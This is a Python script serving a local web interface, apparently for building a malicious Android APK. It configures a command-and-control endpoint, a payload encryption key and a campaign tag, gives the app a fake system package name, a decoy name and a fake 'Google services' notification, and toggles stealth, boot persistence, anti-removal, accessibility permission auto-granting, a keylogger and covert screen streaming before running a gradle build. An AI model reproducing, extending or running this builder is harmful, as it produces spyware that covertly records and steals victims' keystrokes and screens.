#!/usr/bin/env python3
import http.server
import socketserver
import json
import os
import sys
import subprocess
import webbrowser
import threading
import urllib.parse
import secrets

import socket

# --- BUILD_PASSWORD: env override, otherwise random per launch and printed once ---
BUILD_PASSWORD = os.environ.get("BUILD_PASSWORD") or secrets.token_hex(12)
# In-memory session tokens issued by /auth (browser holds tokens, never the password)
SESSION_TOKENS = set()
TOKEN_TTL_SECONDS = 60 * 60  # 60 minutes
# Values that are never acceptable for C2 host or encryption key
BLOCKED_VALUES = {"", "AndroidKernel1337", "TacticalKey2026SecureGCM", "admin1337",
                  "https://lab-rats-v1-6.onrender.com", "http://lab-rats-v1-6.onrender.com",
                  "lab-rats-v1-6.onrender.com"}

def find_free_port(default_port=8000):
    for p in [default_port, 8080, 8888, 9090, 3000]:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                if s.connect_ex(('localhost', p)) != 0:
                    return p
        except Exception:
            pass
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(('', 0))
            return s.getsockname()[1]
    except Exception:
        return default_port

PORT = find_free_port(8000)
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_DIR = os.path.dirname(SCRIPT_DIR)
OUTPUT_DIR = os.path.join(SCRIPT_DIR, "output")

if not os.path.exists(OUTPUT_DIR):
    os.makedirs(OUTPUT_DIR)

HTML_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LAB-RATS | TACTICAL APK BUILDER GUI</title>
    <link href="https://fonts.googleapis.com/css2?family=Aldrich&family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        :root { --neon-cyan: #00f2ff; --neon-green: #39ff14; --neon-yellow: #ffff00; --neon-orange: #ff9d00; --danger: #ff3131; }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background-color: #02080d; background-image: radial-gradient(circle at 50% 0%, rgba(0,242,255,.16) 0, rgba(0,168,179,.05) 40%, transparent 80%), radial-gradient(circle at 0% 100%, rgba(0,242,255,.09) 0, transparent 50%), radial-gradient(circle at 100% 100%, rgba(0,242,255,.09) 0, transparent 50%); color: #00f2ff; font-family: 'Orbitron', sans-serif; min-height: 100vh; padding: 25px; overflow-x: hidden; }
        .window-container { max-width: 1280px; margin: 0 auto; background: rgba(4, 8, 12, 0.75); border: 1px solid var(--neon-cyan); border-radius: 16px; padding: 30px; box-shadow: 0 0 60px rgba(0, 242, 255, 0.2); backdrop-filter: blur(10px); position: relative; }
        .window-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(0, 242, 255, 0.3); padding-bottom: 20px; margin-bottom: 25px; }
        .title-font { font-size: 2.2rem; font-weight: 900; letter-spacing: 3px; color: var(--neon-cyan); text-transform: uppercase; text-shadow: 0 0 20px rgba(0, 242, 255, 0.6); }
        .builder-body { display: flex; gap: 25px; align-items: stretch; min-height: 650px; }
        .sidebar-tabs { width: 240px; flex-shrink: 0; background: rgba(0, 0, 0, 0.5); border: 1px solid rgba(0, 242, 255, 0.3); border-radius: 12px; padding: 15px; display: flex; flex-direction: column; gap: 10px; }
        .tab-btn { padding: 16px 20px; color: #888; font-family: 'Orbitron', sans-serif; font-size: 0.82rem; font-weight: 700; border: 1px solid transparent; border-radius: 8px; cursor: pointer; transition: all 0.3s; text-transform: uppercase; letter-spacing: 1px; display: flex; align-items: center; gap: 12px; background: transparent; }
        .tab-btn:hover { color: var(--neon-cyan); background: rgba(0, 242, 255, 0.08); border-color: rgba(0, 242, 255, 0.2); }
        .tab-btn.active { color: #000 !important; background: var(--neon-cyan) !important; border-color: var(--neon-cyan) !important; box-shadow: 0 0 25px rgba(0, 242, 255, 0.6) !important; }
        .content-area { flex-grow: 1; background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(0, 242, 255, 0.3); border-radius: 12px; padding: 30px; position: relative; }
        .panel { display: none; flex-direction: column; gap: 25px; }
        .panel.active { display: flex; }
        .card-box { border: 1px solid rgba(0, 242, 255, 0.3); border-radius: 12px; padding: 25px; background: rgba(4, 8, 12, 0.65); position: relative; }
        .card-box-title { position: absolute; top: -12px; left: 20px; background: #02080d; padding: 0 12px; font-family: 'Orbitron', sans-serif; font-size: 0.75rem; color: var(--neon-cyan); letter-spacing: 2px; text-transform: uppercase; font-weight: 700; }
        .icon-box { width: 100px; height: 100px; border: 1px solid var(--neon-cyan); border-radius: 20px; background: rgba(0, 242, 255, 0.05); display: flex; align-items: center; justify-content: center; overflow: hidden; box-shadow: 0 0 20px rgba(0, 242, 255, 0.2); }
        .icon-box img { width: 100%; height: 100%; object-fit: cover; }
        .field-group { display: flex; flex-direction: column; gap: 8px; width: 100%; }
        .field-group label { font-family: 'Orbitron', sans-serif; font-size: 0.72rem; color: #aaa; letter-spacing: 1px; }
        .field-group input, .field-group select { background: #000 !important; border: 1px solid rgba(0, 242, 255, 0.3) !important; color: #fff !important; padding: 14px 16px !important; border-radius: 8px !important; font-family: 'JetBrains Mono', monospace !important; font-size: 0.9rem !important; width: 100% !important; outline: none !important; }
        .field-group input:focus, .field-group select:focus { border-color: var(--neon-cyan) !important; box-shadow: 0 0 20px rgba(0, 242, 255, 0.3) !important; }
        .toggle-row { display: flex; align-items: center; justify-content: space-between; padding: 14px 18px; background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 8px; }
        .toggle-row span { font-family: 'Orbitron', sans-serif; font-size: 0.78rem; color: #ccc; }
        .btn-action { background: rgba(0, 242, 255, 0.1); border: 1px solid var(--neon-cyan); color: var(--neon-cyan); padding: 16px 32px; font-family: 'Orbitron', sans-serif; font-size: 0.9rem; font-weight: 900; border-radius: 50px; cursor: pointer; letter-spacing: 2px; text-transform: uppercase; transition: all 0.3s; box-shadow: 0 0 20px rgba(0, 242, 255, 0.3); }
        .btn-action:hover { background: var(--neon-cyan); color: #000; box-shadow: 0 0 40px var(--neon-cyan); transform: scale(1.03); }
        .terminal-window { background: #000; border: 1px solid rgba(0, 242, 255, 0.3); border-radius: 10px; padding: 18px; font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; color: var(--neon-green); height: 260px; overflow-y: auto; text-align: left; box-shadow: inset 0 0 20px rgba(0, 0, 0, 0.9); }
    </style>
</head>
<body>
    <div class="window-container">
        <div class="window-header">
            <div class="title-font">Apk Builder</div>
            <div style="font-size: 0.8rem; color: #888; font-family: 'JetBrains Mono';">v1.6.0 HARDENED</div>
        </div>

        <div class="builder-body">
            <!-- SIDEBAR TABS -->
            <div class="sidebar-tabs">
                <button class="tab-btn active" onclick="showTab('info', this)">Information</button>
                <button class="tab-btn" onclick="showTab('customize', this)">Apk Customize</button>
                <button class="tab-btn" onclick="showTab('options', this)">Options</button>
                <button class="tab-btn" onclick="showTab('access', this)">Accessibility</button>
                <button class="tab-btn" onclick="showTab('build', this)">Build Apk</button>
            </div>

            <!-- CONTENT AREA -->
            <div class="content-area">
                <!-- 1. INFORMATION TAB -->
                <div id="tab-info" class="panel active">
                    <div class="card-box">
                        <div class="card-box-title">C2 Server & Encryption Settings</div>
                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 10px;">
                            <div class="field-group"><label>C2 Server Endpoint / Webhook URL (REQUIRED)</label><input type="text" id="cfg-host" value="" placeholder="https://your-c2.example.com"></div>
                            <div class="field-group"><label>C2 Reverse Listening Port</label><input type="text" id="cfg-port" value="9191"></div>
                            <div class="field-group"><label>AES-256 Payload Encryption Key</label><input type="text" id="cfg-key" value="" placeholder="blank = auto-generated"></div>
                            <div class="field-group"><label>Campaign ID / Target Tag</label><input type="text" id="cfg-campaign" value="OPERATION_NIGHTHAWK"></div>
                        </div>
                    </div>
                </div>

                <!-- 2. APK CUSTOMIZE TAB (MATCHING REFERENCE IMAGE) -->
                <div id="tab-customize" class="panel">
                    <!-- Install Box -->
                    <div class="card-box">
                        <div class="card-box-title">Install</div>
                        <div style="display: flex; gap: 30px; align-items: center; margin-top: 10px;">
                            <div class="field-group" style="flex: 1;"><label>App Name</label><input type="text" id="cfg-app-name" value="connection"></div>
                            <div style="display: flex; flex-direction: column; align-items: center; gap: 10px;">
                                <span style="font-size: 0.72rem; color: #aaa;">App icon</span>
                                <div class="icon-box"><img id="preview-install" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%235383EC' d='M24,2C11.85,2 2,11.85 2,24s9.85,22 22,22 22,-9.85 22,-22S36.15,2 24,2z'/%3E%3Cpath fill='%23FFFFFF' d='M24 14 A6 6 0 1 0 24 26 A6 6 0 1 0 24 14 M14 28 A4 4 0 1 0 14 36 A4 4 0 1 0 14 28 M34 28 A4 4 0 1 0 34 36 A4 4 0 1 0 34 28'/%3E%3C/svg%3E"></div>
                                <span style="font-size: 0.65rem; color: #666;">.......</span>
                            </div>
                        </div>
                    </div>

                    <!-- Lower Split Grid: After Install & Sticky Notification -->
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
                        <!-- After Install Box -->
                        <div class="card-box">
                            <div class="card-box-title">After Install</div>
                            <div style="display: flex; flex-direction: column; gap: 15px; margin-top: 10px;">
                                <div class="field-group"><label>App name</label><input type="text" id="cfg-decoy-name" value="Connection"></div>
                                <div class="field-group"><label>Webview URL</label><input type="text" id="cfg-decoy-url" value="www"></div>
                                <div style="display: flex; align-items: center; gap: 20px;">
                                    <div class="icon-box"><img id="preview-decoy" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%235383EC' d='M24,2C11.85,2 2,11.85 2,24s9.85,22 22,22 22,-9.85 22,-22S36.15,2 24,2z'/%3E%3Cpath fill='%23FFFFFF' d='M24 14 A6 6 0 1 0 24 26 A6 6 0 1 0 24 14 M14 28 A4 4 0 1 0 14 36 A4 4 0 1 0 14 28 M34 28 A4 4 0 1 0 34 36 A4 4 0 1 0 34 28'/%3E%3C/svg%3E"></div>
                                    <span style="font-size: 0.65rem; color: #666;">.......</span>
                                </div>
                            </div>
                        </div>

                        <!-- Sticky Notification Box -->
                        <div class="card-box">
                            <div class="card-box-title">Sticky Notification</div>
                            <div style="display: flex; flex-direction: column; gap: 15px; margin-top: 10px;">
                                <div class="field-group"><label>Notification Title</label><input type="text" id="cfg-notif-title" value="Google services"></div>
                                <div class="field-group"><label>Notification message</label><input type="text" id="cfg-notif-msg" value="Tap to learn more..."></div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- 3. OPTIONS TAB -->
                <div id="tab-options" class="panel">
                    <div class="card-box">
                        <div class="card-box-title">Tactical Options</div>
                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 10px;">
                            <div class="toggle-row"><span>Stealth Camouflage Mode</span><input type="checkbox" id="chk-stealth" checked></div>
                            <div class="toggle-row"><span>Auto-Start on Boot</span><input type="checkbox" id="chk-boot" checked></div>
                            <div class="toggle-row"><span>Anti-Removal Watchdog</span><input type="checkbox" id="chk-anti-removal" checked></div>
                            <div class="toggle-row"><span>Battery Optimization Bypass</span><input type="checkbox" id="chk-battery" checked></div>
                        </div>
                    </div>
                </div>

                <!-- 4. ACCESSIBILITY TAB -->
                <div id="tab-access" class="panel">
                    <div class="card-box">
                        <div class="card-box-title">Accessibility Vectors</div>
                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 10px;">
                            <div class="toggle-row"><span>Auto-Grant Permissions via Accessibility</span><input type="checkbox" id="chk-auto-perm" checked></div>
                            <div class="toggle-row"><span>Stealth Keylogger Engine</span><input type="checkbox" id="chk-keylogger" checked></div>
                            <div class="toggle-row"><span>Ghost Screen Streamer</span><input type="checkbox" id="chk-ghost-stream" checked></div>
                        </div>
                    </div>
                </div>

                <!-- 5. BUILD APK TAB -->
                <div id="tab-build" class="panel">
                    <div class="card-box" style="text-align: center; padding: 35px;">
                        <div class="card-box-title">Compilation & Packaging</div>
                        <div style="display: flex; justify-content: center; align-items: center; gap: 10px; margin-bottom: 25px; flex-wrap: wrap;">
                            <input type="password" id="build-pass" placeholder="BUILD_PASSWORD (printed in server console)" style="background:#000; border:1px solid var(--neon-cyan); color:#fff; padding:10px 14px; border-radius:8px; font-family:'JetBrains Mono', monospace; font-size:0.8rem; width:320px; max-width:80%; outline:none;">
                            <button class="btn-action" style="padding:10px 22px; font-size:0.75rem; margin:0;" onclick="unlockBuilder()">UNLOCK</button>
                        </div>
                        <button id="btn-build" class="btn-action" onclick="runBuildPipeline()" style="margin-bottom: 25px;">GENERATE TACTICAL APK</button>
                        <div id="progress-bar-wrap" style="width: 100%; height: 10px; background: #000; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 20px; display: none; overflow: hidden;">
                            <div id="progress-bar" style="width: 0%; height: 100%; background: var(--neon-cyan); box-shadow: 0 0 15px var(--neon-cyan); transition: width 0.3s;"></div>
                        </div>
                        <div id="term" class="terminal-window">> LOCAL_COMPILATION_PIPELINE_READY</div>
                        <div id="dl-wrap" style="margin-top: 20px; display: none;">
                            <a id="dl-btn" href="#" download class="btn-action" style="border-color: var(--neon-green); color: var(--neon-green); text-decoration: none;">DOWNLOAD SIGNED APK</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        function showTab(id, btn) {
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
            btn.classList.add('active');
            document.getElementById('tab-' + id).classList.add('active');
        }

        let buildToken = null;
        const BLOCKED = ['', 'AndroidKernel1337', 'TacticalKey2026SecureGCM', 'admin1337',
            'https://lab-rats-v1-6.onrender.com', 'http://lab-rats-v1-6.onrender.com', 'lab-rats-v1-6.onrender.com'];

        async function unlockBuilder() {
            const pass = document.getElementById('build-pass').value;
            const term = document.getElementById('term');
            if (!pass) { term.innerHTML += '> AUTH_FAILED: Enter the BUILD_PASSWORD printed in the server console\\n'; return; }
            const r = await fetch('/auth', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ password: pass })
            });
            const d = await r.json();
            if (d.success && d.token) {
                buildToken = d.token;
                term.innerHTML += '> AUTH_OK: Builder unlocked for this session.\\n';
            } else {
                buildToken = null;
                term.innerHTML += '> AUTH_FAILED: Wrong BUILD_PASSWORD.\\n';
            }
        }

        function runBuildPipeline() {
            const btn = document.getElementById('btn-build');
            const barWrap = document.getElementById('progress-bar-wrap');
            const bar = document.getElementById('progress-bar');
            const term = document.getElementById('term');
            const dlWrap = document.getElementById('dl-wrap');

            if (!buildToken) {
                term.innerHTML += '> BUILD_REJECTED: Enter BUILD_PASSWORD and press UNLOCK first.\\n';
                return;
            }

            const c2Host = document.getElementById('cfg-host').value.trim();
            if (!c2Host) {
                term.innerHTML += '> BUILD_REJECTED: C2 Server Endpoint is REQUIRED (empty value is rejected).\\n';
                return;
            }
            if (BLOCKED.includes(c2Host)) {
                term.innerHTML += '> BUILD_REJECTED: C2 endpoint matches a blocked default value. Use your own host.\\n';
                return;
            }

            btn.disabled = true; btn.style.opacity = '0.5';
            barWrap.style.display = 'block'; dlWrap.style.display = 'none';
            bar.style.width = '20%';
            term.innerHTML = '> INITIATING_LOCAL_BUILD...\\n> Updating build_config.txt & Manifest strings...\\n';

            const configData = {
                appName: document.getElementById('cfg-app-name').value,
                pkgName: 'com.android.system.stability',
                c2Host: c2Host,
                encKey: document.getElementById('cfg-key').value.trim(),
                c2Port: document.getElementById('cfg-port').value,
                decoyName: document.getElementById('cfg-decoy-name').value,
                decoyUrl: document.getElementById('cfg-decoy-url').value,
                notifTitle: document.getElementById('cfg-notif-title').value,
                notifMsg: document.getElementById('cfg-notif-msg').value
            };

            fetch('/build', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'x-build-token': buildToken },
                body: JSON.stringify(configData)
            })
            .then(r => r.json())
            .then(d => {
                bar.style.width = '100%';
                if (d.success) {
                    term.innerHTML += '> Local Gradle Build Completed!\\n> Output: apk-builder/output/app-release-signed.apk\\n> STATUS: BUILD_SUCCESS\\n';
                    btn.disabled = false; btn.style.opacity = '1';
                    dlWrap.style.display = 'block';
                    document.getElementById('dl-btn').href = d.downloadUrl + '?token=' + encodeURIComponent(buildToken);
                } else {
                    term.innerHTML += '> BUILD_FAILED: ' + (d.error || 'Unknown error') + '\\n';
                    btn.disabled = false; btn.style.opacity = '1';
                }
            })
            .catch(err => {
                term.innerHTML += '> BUILD_ERROR: Local build request failed\\n';
                btn.disabled = false; btn.style.opacity = '1';
            });
        }
    </script>
</body>
</html>
"""

def _authorized(handler):
    token = handler.headers.get("x-build-token") or ""
    if not token:
        parsed = urllib.parse.urlparse(handler.path)
        token = urllib.parse.parse_qs(parsed.query).get("token", [""])[0]
    return bool(token) and token in SESSION_TOKENS


class BuilderHandler(http.server.SimpleHTTPRequestHandler):
    def _send_json(self, code, obj):
        payload = json.dumps(obj).encode('utf-8')
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)

    def do_GET(self):
        if self.path == "/" or self.path.startswith("/builder"):
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(HTML_PAGE.encode('utf-8'))
        elif self.path.startswith("/output/"):
            if not _authorized(self):
                self.send_error(401, "UNAUTHORIZED: unlock with BUILD_PASSWORD first")
                return
            file_name = os.path.basename(urllib.parse.urlparse(self.path).path)
            file_path = os.path.join(OUTPUT_DIR, file_name)
            if not os.path.exists(file_path):
                # Fallback to source APK
                file_path = os.path.join(PROJECT_DIR, "app", "build", "outputs", "apk", "release", "app-release-unsigned.apk")
            if os.path.exists(file_path):
                self.send_response(200)
                self.send_header("Content-Type", "application/vnd.android.package-archive")
                self.send_header("Content-Disposition", f'attachment; filename="{file_name}"')
                self.send_header("Content-Length", str(os.path.getsize(file_path)))
                self.end_headers()
                with open(file_path, "rb") as f:
                    self.wfile.write(f.read())
            else:
                self.send_error(404, "File Not Found")
        else:
            super().do_GET()

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length)

        if self.path == "/auth":
            try:
                data = json.loads(body.decode('utf-8'))
            except Exception:
                data = {}
            if data.get("password") == BUILD_PASSWORD:
                token = secrets.token_hex(16)
                SESSION_TOKENS.add(token)
                threading.Timer(TOKEN_TTL_SECONDS, lambda: SESSION_TOKENS.discard(token)).start()
                self._send_json(200, {"success": True, "token": token})
            else:
                self._send_json(401, {"success": False})
            return

        if self.path == "/build":
            if not _authorized(self):
                self._send_json(401, {"success": False, "error": "UNAUTHORIZED: unlock with BUILD_PASSWORD first"})
                return
            try:
                data = json.loads(body.decode('utf-8'))
                app_name = data.get('appName', 'connection')
                pkg_name = data.get('pkgName', 'com.android.system.stability')
                c2_host = (data.get('c2Host') or '').strip()
                enc_key = (data.get('encKey') or '').strip()

                # C2 host is REQUIRED and must not match any known/default value
                if c2_host in BLOCKED_VALUES:
                    self._send_json(400, {"success": False,
                                          "error": "C2 host is empty or matches a blocked default value. Enter your own C2 endpoint."})
                    return

                # Encryption key: empty -> auto-generate; blocked default -> reject
                if enc_key in BLOCKED_VALUES:
                    self._send_json(400, {"success": False,
                                          "error": "Encryption key is empty or matches a blocked default value."})
                    return
                if not enc_key:
                    enc_key = secrets.token_urlsafe(16)[:24]

                # Update build_config.txt
                config_path = os.path.join(SCRIPT_DIR, "build_config.txt")
                config_content = f'PKG_NAME="{pkg_name}"\nAPP_NAME="{app_name}"\nVERSION_NAME="1.6.0"\nMIN_SDK="21"\nDECOY_CHOICE="1"\n'
                with open(config_path, "w") as f:
                    f.write(config_content)

                # Update local.properties (WEBHOOK_URL / ENCRYPTION_KEY)
                local_props_path = os.path.join(PROJECT_DIR, "local.properties")
                lines = []
                if os.path.exists(local_props_path):
                    with open(local_props_path, "r") as f:
                        lines = f.read().splitlines()
                for key, value in (("WEBHOOK_URL", c2_host), ("ENCRYPTION_KEY", enc_key)):
                    replaced = False
                    for i, line in enumerate(lines):
                        if line.startswith(key + "="):
                            lines[i] = f"{key}={value}"
                            replaced = True
                    if not replaced:
                        lines.append(f"{key}={value}")
                with open(local_props_path, "w") as f:
                    f.write("\n".join(lines) + "\n")

                # Execute local gradle build (platform-aware wrapper)
                gradle_wrapper = "gradlew.bat" if os.name == "nt" else "./gradlew"
                gradle_cmd = f"cd {PROJECT_DIR} && {gradle_wrapper} assembleRelease --no-daemon"
                proc = subprocess.run(gradle_cmd, shell=True, capture_output=True, text=True)

                out_apk = os.path.join(OUTPUT_DIR, "app-release-signed.apk")
                build_apk = os.path.join(PROJECT_DIR, "app", "build", "outputs", "apk", "release", "app-release-unsigned.apk")

                if os.path.exists(build_apk):
                    with open(build_apk, "rb") as f_in, open(out_apk, "wb") as f_out:
                        f_out.write(f_in.read())

                resp_data = {
                    "success": True,
                    "downloadUrl": "/output/app-release-signed.apk"
                }
            except Exception as e:
                resp_data = {"success": False, "error": str(e)}

            self._send_json(200, resp_data)

def launch_browser():
    url = f"http://localhost:{PORT}"
    try:
        if sys.platform == "darwin":
            subprocess.run(["open", url], check=False)
        elif sys.platform.startswith("linux"):
            subprocess.run(["xdg-open", url], check=False)
        else:
            webbrowser.open(url)
    except Exception:
        webbrowser.open(url)

def main():
    print(f"\n [+] TACTICAL APK BUILDER GUI LAUNCHED (localhost only)")
    print(f" [+] Local Web Interface: http://127.0.0.1:{PORT}")
    print(f" [+] BUILD_PASSWORD: {BUILD_PASSWORD}")
    if not os.environ.get("BUILD_PASSWORD"):
        print(f" [+] (randomly generated for this launch; set env BUILD_PASSWORD to pin it)")
    print(f" [+] Opening default browser...\n")

    threading.Timer(0.8, launch_browser).start()

    with socketserver.TCPServer(("127.0.0.1", PORT), BuilderHandler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[!] Builder GUI Terminated.")

if __name__ == "__main__":
    main()
